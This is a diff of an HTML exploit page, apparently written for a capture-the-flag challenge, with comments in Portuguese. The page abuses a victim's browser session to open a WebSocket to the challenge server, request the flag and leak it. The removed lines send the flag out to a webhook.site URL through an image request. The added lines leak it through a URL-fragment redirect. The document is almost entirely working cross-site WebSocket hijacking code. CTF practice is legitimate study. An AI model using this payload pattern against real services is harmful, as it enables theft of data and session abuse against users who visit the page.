@@ -1,31 +1,59 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Simple Exploit</title>
-</head>
-<body>
-    <h1>Flag Capture</h1>
-    
+  <head>
+    <title>Redirect Attack</title>
+  </head>
+  <body>
+    <h1>Attempting flag capture...</h1>
+
     <script>
-        // Conectar imediatamente ao WebSocket
-        const socket = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
-        
-        socket.onopen = function() {
-            // Enviar comando para obter a flag
-            socket.send(JSON.stringify({ sender: 'user', message: '/getFlag' }));
-        };
-        
-        socket.onmessage = function(event) {
-            const data = JSON.parse(event.data);
-            
-            // Se contiver a flag, exfiltrar via imagem
-            if (data.message && data.message.includes('Flag:')) {
-                const img = new Image();
-                img.src = "https://webhook.site/849b249a-8980-4038-9d90-9fbaa89dc2f8?flag=" + 
-                          encodeURIComponent(data.message);
-                document.body.appendChild(img);
-            }
-        };
+      // Função para redirecionar com a flag na URL
+      function redirectWithFlag(flag) {
+        // Redirecionar para a mesma página, mas com a flag como um fragmento na URL
+        // Fragmentos (#) não são enviados ao servidor, mas ficam visíveis na resposta do bot
+        window.location.href =
+          window.location.href.split("#")[0] +
+          "#flag=" +
+          encodeURIComponent(flag);
+      }
+
+      // Conectar ao WebSocket
+      const socket = new WebSocket("wss://wembsoncket.chal.cyberjousting.com");
+
+      socket.onopen = function () {
+        console.log("Conexão estabelecida");
+
+        // Enviar comando para obter a flag
+        socket.send(
+          JSON.stringify({
+            sender: "user",
+            message: "/getFlag",
+          })
+        );
+      };
+
+      socket.onmessage = function (event) {
+        console.log("Mensagem recebida");
+        const data = JSON.parse(event.data);
+
+        // Se receber a flag, redirecionar
+        if (data.message && data.message.includes("Flag:")) {
+          redirectWithFlag(data.message);
+        }
+      };
+
+      // Se já temos uma flag no URL (após redirecionamento), exibi-la
+      window.onload = function () {
+        if (window.location.hash && window.location.hash.includes("flag=")) {
+          const flag = decodeURIComponent(
+            window.location.hash.split("flag=")[1]
+          );
+          document.body.innerHTML +=
+            '<div style="color:red; font-size:24px; margin-top:20px;">Flag encontrada: ' +
+            flag +
+            "</div>";
+        }
+      };
     </script>
-</body>
+  </body>
 </html>
